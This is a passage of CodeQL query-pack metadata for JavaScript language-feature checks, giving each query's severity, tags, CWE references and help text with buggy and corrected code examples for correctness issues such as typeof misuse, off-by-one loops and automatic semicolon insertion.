    Here, the spacing around `+` and `>>` suggests the grouping `capacity + (capacity>>1)`, that is, the allocated array should be 50% larger than the given capacity.

    However, `+` has higher precedence than `>>`, so this code allocates an array of size `(capacity + capacity) >> 1`, which is the same as `capacity`.

    To fix this issue, parentheses should be used like this:


    ```javascript
    var a = new Array(capacity + (capacity>>1));
    ```

    ## References
    * J. Bloch and N. Gafter, *Java Puzzlers: Traps, Pitfalls, and Corner Cases*, Puzzle 35. Addison-Wesley, 2005.
    * Common Weakness Enumeration: [CWE-783](https://cwe.mitre.org/data/definitions/783.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: LanguageFeatures/BadTypeof.ql
  relativeBqrsPath: codeql/javascript-queries/LanguageFeatures/BadTypeof.bqrs
  metadata:
    name: Useless type test
    description: |-
      Comparing the result of a typeof test against a string other than 'undefined',
                    'boolean', 'number', 'string', 'object', 'function' or 'symbol' is useless, since
                    this comparison can never succeed.
    kind: problem
    problem.severity: error
    id: js/useless-type-test
    tags: |-
      quality
             reliability
             correctness
             language-features
             external/cwe/cwe-570
             external/cwe/cwe-571
    precision: very-high
  queryHelp: "# Useless type test\nIn ECMAScript 5, the `typeof` operator returns\
    \ one of the following six type tags: `\"undefined\"`, `\"boolean\"`, `\"number\"\
    `, `\"string\"`, `\"object\"`, `\"function\"`. In ECMAScript 2015, it may additionally\
    \ return `\"symbol\"`, while on older versions of Internet Explorer it may return\
    \ `\"unknown\"` or `\"date\"` in certain situations. Comparing it against any\
    \ other string literal is therefore useless.\n\n\n## Recommendation\nCarefully\
    \ examine the comparison in question. If the type tag is simply misspelled, correct\
    \ it. In some cases, the type tag returned by `typeof` is not sufficiently precise,\
    \ so you may have to use other type test functions.\n\n\n## Example\nThe following\
    \ code snippet tries to determine whether `a` is an array:\n\n\n```javascript\n\
    if (typeof a === 'array')\n\tconsole.log(\"It's an array!\");\n```\nNote that\
    \ `typeof` is not precise enough to distinguish arrays from other objects, since\
    \ it returns the type tag `\"object\"` for both. ECMAScript 5-compatible platforms\
    \ provide a library function `Array.isArray` that can be used instead:\n\n\n```javascript\n\
    if (Array.isArray(a))\n\tconsole.log(\"It's an array!\");\n```\nOn older platforms,\
    \ you can use the technique explained on the [Mozilla Developer Network](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/isArray#Compatibility).\n\
    \n\n## References\n* Mozilla Developer Network: [typeof](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/typeof).\n\
    * Mozilla Developer Network: [Array.isArray()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/isArray).\n\
    * Common Weakness Enumeration: [CWE-570](https://cwe.mitre.org/data/definitions/570.html).\n\
    * Common Weakness Enumeration: [CWE-571](https://cwe.mitre.org/data/definitions/571.html).\n"
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: LanguageFeatures/ConditionalComments.ql
  relativeBqrsPath: codeql/javascript-queries/LanguageFeatures/ConditionalComments.bqrs
  metadata:
    name: Conditional comments
    description: Conditional comments are an IE-specific feature and not portable.
    kind: problem
    problem.severity: warning
    id: js/conditional-comment
    tags: |-
      quality
             reliability
             correctness
             portability
             language-features
             external/cwe/cwe-758
    precision: very-high
  queryHelp: |
    # Conditional comments
    Conditional comments are only supported in Internet Explorer and should be avoided for portability.


    ## Recommendation
    Use feature detection (as offered by major frameworks such as [jQuery](http://jquery.com)) instead.


    ## Example
    The following code snippet uses conditional comments to detect whether it is running on Internet Explorer 9 or newer. A better alternative would be to directly check for the desired features using, for instance, jQuery's `$.support` object.


    ```javascript
    /*@cc_on
      @if (@_jscript_version >= 6)
        console.log("You're running a new version of IE.");
      @else
        console.log("You're running an old version of IE.");
      @end
      @*/

    ```
    Note that conditional comments are no longer supported in Internet Explorer 11 Standards mode.


    ## References
    * Internet Explorer Dev Center: [@cc_on Statement (JavaScript)](http://web.archive.org/web/20121103072038/http://msdn.microsoft.com/en-us/library/ie/8ka90k2e(v=vs.94).aspx).
    * Common Weakness Enumeration: [CWE-758](https://cwe.mitre.org/data/definitions/758.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: LanguageFeatures/DeleteVar.ql
  relativeBqrsPath: codeql/javascript-queries/LanguageFeatures/DeleteVar.bqrs
  metadata:
    name: Deleting non-property
    description: The operand of the 'delete' operator should always be a property
      accessor.
    kind: problem
    problem.severity: warning
    id: js/deletion-of-non-property
    tags: |-
      quality
             reliability
             correctness
             language-features
             external/cwe/cwe-480
    precision: very-high
  queryHelp: "# Deleting non-property\nThe `delete` operator should only be used to\
    \ delete properties from objects. Using it to delete variables makes code hard\
    \ to maintain and will break in strict mode.\n\n\n## Recommendation\nIf the variable\
    \ you are deleting is a global variable, this is a sign that your code relies\
    \ too much on global state. Try encapsulating this global state by means of one\
    \ of the module patterns introduced in *JavaScript: The Good Parts*.\n\n\n## Example\n\
    In the following code snippet, `delete` is used to clean up the global `cache`\
    \ variable used by function `get`.\n\n\n```javascript\nvar cache;\n\nfunction\
    \ init() {\n\tcache = {};\n}\n\nfunction done() {\n\tdelete cache;\n}\n\nfunction\
    \ get(k) {\n\tk = '$' + k;\n\tif (!cache.hasOwnProperty(k))\n\t\tcache[k] = compute(k);\n\
    \treturn cache[k];\n}\n\nfunction compute(k) {\n\t// compute value for k\n\t//\
    \ ...\n}\n```\nIt would be clearer to wrap the whole module into a closure like\
    \ this (which also avoids exposing function `compute` to the outside world):\n\
    \n\n```javascript\n(function(global) {\n\tvar cache;\n\n\tglobal.init = function\
    \ init() {\n\t\tcache = {};\n\t};\n\n\tglobal.done = function done() {\n\t};\n\
    \n\tglobal.get = function get(k) {\n\t\tk = '$' + k;\n\t\tif (!cache.hasOwnProperty(k))\n\
    \t\t\tcache[k] = compute(k);\n\t\treturn cache[k];\n\t}\n\n\tfunction compute(k)\
    \ {\n\t\t// compute value for k\n\t\t// ...\n\t}\n}(this));\n```\n\n## References\n\
    * JSLint Error Explanations: [Only properties should be deleted](http://jslinterrors.com/only-properties-should-be-deleted).\n\
    * Common Weakness Enumeration: [CWE-480](https://cwe.mitre.org/data/definitions/480.html).\n"
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: LanguageFeatures/ExpressionClosures.ql
  relativeBqrsPath: codeql/javascript-queries/LanguageFeatures/ExpressionClosures.bqrs
  metadata:
    name: Use of platform-specific language features
    description: |-
      Non-standard language features such as expression closures or let expressions
                    make it harder to reuse code.
    kind: problem
    problem.severity: warning
    id: js/non-standard-language-feature
    tags: |-
      quality
             maintainability
             readability
             portability
             language-features
             external/cwe/cwe-758
    precision: very-high
  queryHelp: "# Use of platform-specific language features\nNon-standard language\
    \ extensions such as expression closures or `let` expressions should be avoided,\
    \ since they make code harder to read or reuse.\n\n\n## Recommendation\nUse standard\
    \ language features instead. For instance, expression closures can be replaced\
    \ by ECMAScript 2015 arrow functions, or alternatively by plain functions; `let`\
    \ statements and expressions can be replaced by ECMAScript 2015 `let` declarations;\
    \ and `for each ... in` statements can be replaced by ECMAScript 2015 `for ...\
    \ of` statements.\n\n\n## Example\nThe following example uses an expression closure\
    \ with `map`:\n\n\n```javascript\n[1, 2, 3].map(function(x) x * x);\n```\nThe\
    \ equivalent code using an ECMAScript 2015 arrow function is as follows:\n\n\n\
    ```javascript\n[1, 2, 3].map((x) => x * x);\n```\nOn ECMAScript 2015 platforms,\
    \ a plain function can be used instead:\n\n\n```javascript\n[1, 2, 3].map(function\
    \ (x) { return x * x; });\n```\nAs another example, consider this use of a `let`\
    \ statement:\n\n\n```javascript\nfunction sumOfSquares(a) {\n\tvar sum = 0;\n\t\
    for (var i=0; i<a.length; ++i) {\n\t\tlet (square = a[i]*a[i]) {\n\t\t\tsum +=\
    \ square;\n\t\t}\n\t}\n\treturn sum;\n}\n\n```\nIt can easily be replaced by a\
    \ block-scoped `let` declaration:\n\n\n```javascript\nfunction sumOfSquares(a)\
    \ {\n\tvar sum = 0;\n\tfor (var i=0; i<a.length; ++i) {\n\t\tlet square = a[i]*a[i];\n\
    \t\tsum += square;\n\t}\n\treturn sum;\n}\n\n```\nOlder versions of Firefox support\
    \ a postfix notation for array comprehensions:\n\n\n```javascript\nvar numbers\
    \ = [1, 2, 3, 4, 5];\nvar squares = [i*i for (i of numbers)];\n```\nThis notation\
    \ should be converted into the semantically equivalent prefix notation supported\
    \ by newer browsers:\n\n\n```javascript\nvar numbers = [1, 2, 3, 4, 5];\nvar squares\
    \ = [for (i of numbers) i*i];\n```\n\n## References\n* Mozilla Developer Network:\
    \ [Arrow functions](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Functions/Arrow_functions).\n\
    * Mozilla Developer Network: [Non-standard let extensions](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/let#Non-standard_let_extensions).\n\
    * Mozilla Developer Network: [for each...in](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/for_each...in).\n\
    * Common Weakness Enumeration: [CWE-758](https://cwe.mitre.org/data/definitions/758.html).\n"
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: LanguageFeatures/ForInComprehensionBlocks.ql
  relativeBqrsPath: codeql/javascript-queries/LanguageFeatures/ForInComprehensionBlocks.bqrs
  metadata:
    name: Use of for-in comprehension blocks
    description: |-
      'for'-'in' comprehension blocks are a Mozilla-specific language extension
                    that is no longer supported.
    kind: problem
    problem.severity: error
    id: js/for-in-comprehension
    tags: |-
      quality
             maintainability
             readability
             portability
             language-features
             external/cwe/cwe-758
    precision: very-high
  queryHelp: |
    # Use of for-in comprehension blocks
    `for`-`in` blocks in array comprehensions are a Mozilla-specific language extensions that is no longer supported even by SpiderMonkey, and is unlikely to be included in future ECMAScript standards. This language feature should not be used.


    ## Recommendation
    The `for`-`in` block can be replaced by a (standards-compliant) `for`-`of` block iterating over a list of property names obtained, for example, from `Object.keys`.


    ## Example
    In the following contrived example, a `for`-`in` block is used to iterate over the keys `i` of an array and construct an array of strings of the form `"v = a[i]"`, where `v` is the value of `a[i]`.


    ```javascript
    var a = [23,,42];
    var desc = [for(i in a) i + " = a[" + i + "]"];

    ```
    The example can be rewritten to use a `for`-`of` block iterating over `Object.keys(a)` instead.


    ```javascript
    var a = [23,,42];
    var desc = [for(i of Object.keys(a)) i + " = a[" + i + "]"];

    ```
    Note that `Object.keys` only includes own properties, not properties inherited from a prototype. If the latter behavior is needed, the array comprehension should be replaced by a `for`-`in` loop that imperatively populates the result array.


    ## References
    * Mozilla Developer Network: [Array comprehensions: Differences to the older JS1.7.2/JS1.8 comprehensions](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Array_comprehensions#Differences_to_the_older_JS1.7.2FJS1.8_comprehensions).
    * Common Weakness Enumeration: [CWE-758](https://cwe.mitre.org/data/definitions/758.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: LanguageFeatures/IllegalInvocation.ql
  relativeBqrsPath: codeql/javascript-queries/LanguageFeatures/IllegalInvocation.bqrs
  metadata:
    name: Illegal invocation
    description: |-
      Attempting to invoke a method or an arrow function using 'new',
                    or invoking a constructor as a function, will cause a runtime
                    error.
    kind: problem
    problem.severity: error
    id: js/illegal-invocation
    tags: |-
      quality
             reliability
             correctness
             language-features
    precision: high
  queryHelp: |
    # Illegal invocation
    Class methods and arrow functions must not be invoked using `new`, and attempting to do so will result in a runtime error.

    Conversely, constructors can only be invoked using `new` or `super(...)`, and attempting to invoke them as a normal function will result in a runtime error.


    ## Recommendation
    Correct the invocation in question by adding or removing `new` as appropriate.


    ## Example
    In the following example, `Point` is a class, but on line 8 it is invoked without `new`. This will lead to a runtime error.

    ```javascript

    class Point {
      constructor(x, y) {
        this.x = x;
        this.y = y;
      }
    }

    let p = Point(23, 42);

    ```
    Instead, `new` should be used:

    ```javascript

    class Point {
      constructor(x, y) {
        this.x = x;
        this.y = y;
      }
    }

    let p = new Point(23, 42);

    ```

    ## References
    * Mozilla Developer Network: [Constructors](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Classes/constructor).
    * Mozilla Developer Network: [Arrow functions](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Functions/Arrow_functions).
    * Mozilla Developer Network: [Method definitions](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Functions/Method_definitions).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: LanguageFeatures/InconsistentNew.ql
  relativeBqrsPath: codeql/javascript-queries/LanguageFeatures/InconsistentNew.bqrs
  metadata:
    name: Inconsistent use of 'new'
    description: |-
      If a function is intended to be a constructor, it should always
                    be invoked with 'new'. Otherwise, it should always be invoked
                    as a normal function, that is, without 'new'.
    kind: problem
    problem.severity: warning
    id: js/inconsistent-use-of-new
    tags: |-
      quality
             reliability
             correctness
             language-features
    precision: very-high
  queryHelp: |
    # Inconsistent use of 'new'
    JavaScript does not enforce a distinction between constructor functions and normal functions, so the same function can be invoked both as a constructor with `new` and as a normal function without `new`. This is unusual, however, and can often indicate a bug.


    ## Recommendation
    Examine the function in question and all calls to it. If it is not actually meant to be invoked as a constructor, turn all constructor calls to it into normal function calls. If it *is* meant to be invoked as a constructor, either turn all normal function calls to it into constructor calls, or introduce a guard for intercepting calls without `new` as described below.


    ## Example
    In the following example, `Point` is clearly meant to be a constructor function, but on line 7 it is invoked without `new`. This means that `this` in the function body will refer to the global object, so the assignments to `x` and `y` will create global variables.


    ```javascript
    function Point(x, y) {
      this.x = x;
      this.y = y;
    }

    var p = new Point(23, 42),
        q = Point(56, 72);

    ```
    The easiest way to fix this is to rewrite the call on line 7 to use `new`:


    ```javascript
    function Point(x, y) {
      this.x = x;
      this.y = y;
    }

    var p = new Point(23, 42),
        q = new Point(56, 72);

    ```
    Alternatively, if you absolutely have to make it possible to call `Point` both with and without `new`, you could insert a guard that intercepts calls without `new` as follows:


    ```javascript
    function Point(x, y) {
      if (!(this instanceof Point))
        return new Point(x, y);
      this.x = x;
      this.y = y;
    }

    var p = new Point(23, 42),
        q = Point(56, 72);

    ```
    Now, if `Point` is invoked without `new`, its `this` object (which is the global object) is not an instance of `Point`, so the "then" branch of the `if` statement is executed, which re-invokes `Point` on the same arguments, but this time with `new`.


    ## References
    * D. Crockford, *JavaScript: The Good Parts*, Appendix B.11. O'Reilly, 2008.
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: LanguageFeatures/InvalidPrototype.ql
  relativeBqrsPath: codeql/javascript-queries/LanguageFeatures/InvalidPrototype.bqrs
  metadata:
    name: Invalid prototype value
    description: |-
      An attempt to use a value that is not an object or 'null' as a
                    prototype will either be ignored or result in a runtime error.
    kind: problem
    problem.severity: error
    id: js/invalid-prototype-value
    tags: |-
      quality
             reliability
             correctness
             language-features
             external/cwe/cwe-704
    precision: high
  queryHelp: |
    # Invalid prototype value
    All JavaScript objects (including functions, classes and arrays) have a prototype, which is either `null` or another object. The prototype of an object can be set in two ways, both of which guard against attempts to assign an invalid prototype (such as a primitive value):

    1. Assigning a value to the object's `__proto__` property; if the value is not a valid prototype, the assignment is silently ignored.
    1. Using the standard library functions `Object.create` or `Object.setPrototypeOf`; invalid prototype values lead to a runtime error.
    In summary, any attempt to set the prototype of an object to a value that is not an object or `null` will be ineffective and may lead to a runtime error.


    ## Recommendation
    Fix the prototype assignment by providing a valid prototype value.


    ## Example
    The following code attempts to create an object with prototype `undefined`, which will cause an error at runtime:

    ```javascript

    let dict = Object.create(undefined);

    ```
    If the intention is to create an object without a prototype object, `null` should be used instead:

    ```javascript

    let dict = Object.create(null);

    ```

    ## References
    * Mozilla Developer Network: [Inheritance and the prototype chain](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Inheritance_and_the_prototype_chain).
    * Common Weakness Enumeration: [CWE-704](https://cwe.mitre.org/data/definitions/704.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: LanguageFeatures/LengthComparisonOffByOne.ql
  relativeBqrsPath: codeql/javascript-queries/LanguageFeatures/LengthComparisonOffByOne.bqrs
  metadata:
    name: Off-by-one comparison against length
    description: |-
      An array index is compared to be less than or equal to the 'length' property,
                    and then used in an indexing operation that could be out of bounds.
    kind: problem
    problem.severity: warning
    id: js/index-out-of-bounds
    tags: |-
      quality
             reliability
             correctness
             logic
             language-features
             external/cwe/cwe-193
    precision: high
  queryHelp: |
    # Off-by-one comparison against length
    Reading an array element from an index that is greater than the array length always returns `undefined`. If the index is compared to the array length using the less-than-or-equal operator `<=` instead of the less-than operator `<`, the index could be out of bounds, which may not be intentional and may adversely affect performance.


    ## Recommendation
    Use less-than (`<`) rather than less-than-or-equal (`<=`) when comparing a potential index against the array length. For loops that iterate over every element in an array, use a `for...of` loop or the `forEach` method instead of explicitly iterating over all indices.


    ## Example
    The following example shows a function that intends to check whether an array `a` contains an element `elt` by iterating over its elements and comparing them to `elt`. However, the terminating condition of the loop is incorrectly specified as `i <= a.length`, not `i < a.length`, so `elt` will additionally be compared against the value `undefined` read from index `a.length`, meaning that the function considers every array to contain `undefined`:


    ```javascript
    function contains(a, elt) {
      for (let i = 0; i <= a.length; ++i)
        if (a[i] === elt)
          return true;
      return false;
    }
    ```
    The problem can be fixed by using less-than instead of less-than-or-equals:


    ```javascript
    function contains(a, elt) {
      for (let i = 0; i < a.length; ++i)
        if (a[i] === elt)
          return true;
      return false;
    }
    ```

    ## References
    * Mozilla Developer Network: [Array.length](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/length)
    * Mozilla Developer Network: [Array.forEach](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/forEach)
    * Mozilla Developer Network: [for...of](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/for...of)
    * Common Weakness Enumeration: [CWE-193](https://cwe.mitre.org/data/definitions/193.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: LanguageFeatures/NonLinearPattern.ql
  relativeBqrsPath: codeql/javascript-queries/LanguageFeatures/NonLinearPattern.bqrs
  metadata:
    name: Non-linear pattern
    description: |-
      If the same pattern variable appears twice in an array or object pattern,
                    the second binding will silently overwrite the first binding, which is probably
                    unintentional.
    kind: problem
    problem.severity: error
    id: js/non-linear-pattern
    tags: |-
      quality
             reliability
             correctness
             language-features
    precision: very-high
  queryHelp: |
    # Non-linear pattern
    If the same pattern variable is bound multiple times in the same object or array pattern, the last binding overwrites all of the earlier ones. This is most likely unintended and should be avoided.

    In TypeScript, a common mistake is to try to write type annotations inside a pattern. This is not possible, and the type annotation should come after the pattern.


    ## Recommendation
    Rename the pattern variables to have different names. In an array pattern, elements that do not need to be bound can be omitted.


    ## Example
    In the following example, the function `distanceFromOrigin` uses an array pattern to decompose its argument `point`. The pattern binds `x` twice: first, `x` is bound to `point[0]`, the first element of `point`; this binding is then immediately overwritten by a binding to `point[1]`, which is probably unintended.


    ```javascript
    function distanceFromOrigin(point) {
        var [x, x] = point;
        return Math.sqrt(x*x + y*y);
    }

    ```
    From context, it appears that the second binding should have been for variable `y` like this:


    ```javascript
    function distanceFromOrigin(point) {
        var [x, y] = point;
        return Math.sqrt(x*x + y*y);
    }

    ```
    This can sometimes happen in TypeScript, due to the apparent similarity between property patterns and type annotations. In the following example, the function uses a pattern parameter with properties `x` and `y`. These appear to have type `number`, but are in fact untyped properties both stored in a variable named `number`.


    ```javascript
    function distance({x: number, y: number}) {
        return Math.sqrt(x*x + y*y);
    }

    ```
    It is not possible to specify type annotations inside a pattern. The correct way is to specify the type after the parameter:


    ```javascript
    function distance({x, y}: {x: number, y: number}) {
        return Math.sqrt(x*x + y*y);
    }

    ```

    ## References
    * Mozilla Developer Network: [Destructuring assignment](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Destructuring_assignment).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: LanguageFeatures/PropertyWriteOnPrimitive.ql
  relativeBqrsPath: codeql/javascript-queries/LanguageFeatures/PropertyWriteOnPrimitive.bqrs
  metadata:
    name: Assignment to property of primitive value
    description: |-
      Assigning to a property of a primitive value has no effect
                    and may trigger a runtime error.
    kind: problem
    problem.severity: error
    id: js/property-assignment-on-primitive
    tags: |-
      quality
             reliability
             correctness
             language-features
             external/cwe/cwe-704
    precision: high
  queryHelp: |
    # Assignment to property of primitive value
    In JavaScript, primitive values such as numbers and strings are immutable. Assigning to a property of a primitive value has, in general, no effect, while attempting to manipulate such a property using `Object.defineProperty` will result in a runtime error.

    There is one exception: assigning to a property for which a setter has been defined on the corresponding prototype object (such as `Number.prototype` or `String.prototype`) will invoke the setter function.


    ## Recommendation
    Carefully examine the assignment in question. A common mistake is trying to change the contents of a string by treating it as an array of characters and assigning to its elements. This has no effect, since strings are immutable in JavaScript. Instead, a new string should be created using string concatenation.

    Assignments that rely on setters on prototype objects may work as intended, but this behavior is subtle and hard to understand, and therefore should be avoided.


    ## Example
    The following code snippet tries to pad the string `s` to a length divisible by eight by mutating its characters:

    ```javascript

    for (var i=s.length; i%8; ++i)
      s[i] = ' ';

    ```
    This approach will not work because strings are immutable in JavaScript. Instead, string concatenation should be used to pad the string:

    ```javascript

    for (var i=s.length; i%8; ++i)
      s += ' ';

    ```

    ## References
    * Ecma International, [ECMAScript 2016 Language Specification, Section 12.15: Assignment Operators](https://262.ecma-international.org/7.0/#prod-AssignmentExpression).
    * Ecma International, [ECMAScript 2016 Language Specification, Section 19.1.2.4: Object.defineProperty](https://262.ecma-international.org/7.0/#sec-object.defineproperty).
    * Common Weakness Enumeration: [CWE-704](https://cwe.mitre.org/data/definitions/704.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: LanguageFeatures/SemicolonInsertion.ql
  relativeBqrsPath: codeql/javascript-queries/LanguageFeatures/SemicolonInsertion.bqrs
  metadata:
    name: Semicolon insertion
    description: Code that uses automatic semicolon insertion inconsistently is hard
      to read and maintain.
    kind: problem
    problem.severity: recommendation
    id: js/automatic-semicolon-insertion
    tags: |-
      quality
             maintainability
             readability
             language-features
             statistical
             non-attributable
    precision: very-high
  queryHelp: "# Semicolon insertion\nSome statements in JavaScript do not have to\
    \ be terminated by an explicit semicolon; the parser will implicitly insert a\
    \ semicolon when it encounters a newline character in such situations. This is\
    \ a dangerous feature since it can mask subtle errors and confuse readers; it\
    \ should not be relied on.\n\n\n## Recommendation\nMake the implicitly inserted\
    \ semicolon explicit.\n\n\n## Example\nIn the following code snippet, the programmer\
    \ most likely intended to return an object literal with a single property `status`.\n\
    \n\n```javascript\nfunction f() {\n\treturn\n\t{\n\t\tstatus: 'OK'\n\t}\n}\n```\n\
    However, since there is a newline after the `return` keyword, the parser inserts\
    \ an implicit semicolon after `return`; the object literal is then interpreted\
    \ as a block containing a single statement with the label `status`. Since it comes\
    \ right after a `return`, this block is, of course, never executed, and instead\
    \ of returning an object literal the function now returns `undefined`.\n\nTo fix\
    \ this bug, the opening curly brace of the object literal should be put on the\
    \ same line as the `return` keyword:\n\n\n```javascript\nfunction f() {\n\treturn\
    \ {\n\t\tstatus: 'OK'\n\t};\n}\n```\n\n## References\n* D. Crockford, *JavaScript:\
    \ The Good Parts*, Appendix A.3. O'Reilly, 2008.\n"
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: LanguageFeatures/SetterReturn.ql
  relativeBqrsPath: codeql/javascript-queries/LanguageFeatures/SetterReturn.bqrs
  metadata:
    name: Useless return in setter
    description: |-
      Returning a value from a setter function is useless, since it will
                    always be ignored.
    kind: problem
    problem.severity: warning
    id: js/setter-return
    tags: |-
      quality
             maintainability
             useless-code
             language-features
    precision: very-high
  queryHelp: "# Useless return in setter\nReturning a value from a property setter\
    \ function is useless, since it will always be ignored.\n\n\n## Recommendation\n\
    Remove the return statement altogether, or replace it with a simple `return;`\
    \ statement that does not return a value.\n\n\n## Example\nThe following example\
    \ shows a constructor function `Point` that uses property accessors on `x` and\
    \ `y` to ensure that they are only set to integer values. It returns the new values\
    \ for `x` and `y` from their setters, but these return values will simply be ignored.\n\
    \n\n```javascript\nfunction Point(x, y) {\n\treturn {\n\t\tget x() { return x;\
    \ },\n\t\tset x(_x) { x = _x|0; return x; },\n\t\tget y() { return y; },\n\t\t\
    set y(_y) { y = _y|0; return y; }\n\t};\n}\n```\nIt would be clearer to omit the\
    \ return statements:\n\n\n```javascript\nfunction Point(x, y) {\n\treturn {\n\t\
    \tget x() { return x; },\n\t\tset x(_x) { x = _x|0; },\n\t\tget y() { return y;\
    \ },\n\t\tset y(_y) { y = _y|0; }\n\t};\n}\n```\n\n## References\n* Mozilla Developer\
    \ Network: [Property setters](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Functions/set).\n"
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: LanguageFeatures/SpuriousArguments.ql
  relativeBqrsPath: codeql/javascript-queries/LanguageFeatures/SpuriousArguments.bqrs
  metadata:
    name: Superfluous trailing arguments
    description: A function is invoked with extra trailing arguments that are ignored.
    kind: problem
    problem.severity: warning
    id: js/superfluous-trailing-arguments
    tags: |-
      quality
             reliability
             correctness
             language-features
             external/cwe/cwe-685
    precision: very-high
  queryHelp: "# Superfluous trailing arguments\nFunction calls in JavaScript may pass\
    \ an arbitrary number of arguments to the invoked function. If the invoked function\
    \ declares fewer parameters than arguments were passed, the remaining arguments\
    \ can only be accessed through the `arguments` object. Hence, if a function is\
    \ passed too many arguments but does *not* use the `arguments` object, the remaining\
    \ arguments are useless. Such calls often indicate incomplete refactorings, or\
    \ may point to a misunderstanding of the functionality of the invoked function.\n\
    \n\n## Recommendation\nRemove the extra parameters if they are unnecessary. Otherwise,\
    \ further investigation may be necessary to determine how to update the function\
    \ call.\n\n\n## Example\nThe following code snippet defines a function `f` that\
    \ does not declare any parameters and does not use the `arguments` object. The\
    \ only call to `f` passes it a single argument `42`, which is not used by `f`\
    \ in any way and thus can be removed.\n\n\n```javascript\nfunction f() {\n\tvar\
    \ x = 23;\n\treturn x+19;\n}\n\nf(42);\n```\n\n## References\n* Ecma International,\
    \ *ECMAScript Language Definition*, 5.1 Edition, Section 10. ECMA, 2011.\n* Common\
    \ Weakness Enumeration: [CWE-685](https://cwe.mitre.org/data/definitions/685.html).\n"
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: LanguageFeatures/StrictModeCallStackIntrospection.ql
  relativeBqrsPath: codeql/javascript-queries/LanguageFeatures/StrictModeCallStackIntrospection.bqrs
  metadata:
    name: Use of call stack introspection in strict mode
    description: |-
      Accessing properties 'arguments.caller', 'arguments.callee',
                    'Function.prototype.caller' or 'Function.prototype.arguments'
                    in strict mode will cause a runtime error.
    kind: problem
    problem.severity: error
    id: js/strict-mode-call-stack-introspection
    tags: |-
      quality
             reliability
             correctness
             language-features
    precision: high
  queryHelp: |
    # Use of call stack introspection in strict mode
    The properties `callee` and `caller` of arguments objects as well as the properties `caller` and `arguments` of function objects are not available in strict-mode code, and any attempt to access them will result in a runtime error.


    ## Recommendation
    Instead of using `arguments.callee`, you can refer to the enclosing function by its name (possibly giving it a name first if it is an anonymous function expression). Uses of the other properties can often be eliminated by refactoring the program.


    ## Example
    In the following example, `arguments.callee` is used to recursively invoke the enclosing function, which is anonymous.

    ```javascript

    var o = {
      A: function(x) {
           'use strict';
           if (!(this instanceof arguments.callee))
             return new arguments.callee(x);
           this.x = x;
         }
    };

    ```
    To avoid this use, the function can be given a name and referred to using that name:

    ```javascript

    var o = {
      A: function A(x) {
           'use strict';
           if (!(this instanceof A))
             return new A(x);
           this.x = x;
         }
    };

    ```

    ## References
    * Mozilla Developer Network: [arguments](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Functions_and_function_scope/arguments).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: LanguageFeatures/SyntaxError.ql
  relativeBqrsPath: codeql/javascript-queries/LanguageFeatures/SyntaxError.bqrs
  metadata:
    name: Syntax error
    description: A piece of code could not be parsed due to syntax errors.
    kind: problem
    problem.severity: recommendation
    id: js/syntax-error
    tags: |-
      quality
             reliability
             correctness
             language-features
    precision: very-high
  queryHelp: |
    # Syntax error
    Syntax errors prevent code from executing correctly. If a piece of code contains syntax errors, this most likely indicates that it is never run and thus is dead code that should be removed.


    ## Recommendation
    Fix the syntax error. It may also be worth investigating whether the file containing the erroneous code fragment is ever included from anywhere. If it is not, then it is dead code, which should be removed.


    ## Example
    In the following example, function `findBox` contains incomplete code: the string literal and its containing block statement are not properly terminated, leading to a syntax error.


    ```javascript
    function findBox() {
      return $("box.important
    ```

    ## References
    * Ecma International, *ECMAScript Language Definition*, 5.1 Edition, Section 15.11.6.4. ECMA, 2011.
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: LanguageFeatures/TemplateSyntaxInStringLiteral.ql
  relativeBqrsPath: codeql/javascript-queries/LanguageFeatures/TemplateSyntaxInStringLiteral.bqrs
  metadata:
    name: Template syntax in string literal
    description: A string literal appears to use template syntax but is not quoted
      with backticks.
    kind: problem
    problem.severity: warning
    id: js/template-syntax-in-string-literal
    precision: high
    tags: |-
      quality
             reliability
             correctness
             language-features
  queryHelp: |
    # Template syntax in string literal
    Template literals are strings enclosed with backticks (``` `` ```). These may contain placeholder expressions with the syntax `${*..*}`, which are evaluated at runtime and inserted as part of the string.

    Ordinary string literals may be enclosed by single (`''`) or double quotes (`""`), and the placeholder syntax `${*..*}` has no special meaning in these.

    In files that make use of template literals, it is hard to distinguish actual template literals from ordinary strings that happen to contain placeholder syntax. This is often the result of mistyping the quotes on a template literal.


    ## Recommendation
    Consider if this was intended to be a template literal, and if so, change the quotes to backticks (``` `` ```). Alternatively:

    * Rename some local variables so that the placeholders do not give the impression of referencing those.
    * Avoid mixing JavaScript template literals with other template systems in the same file.

    ## Example
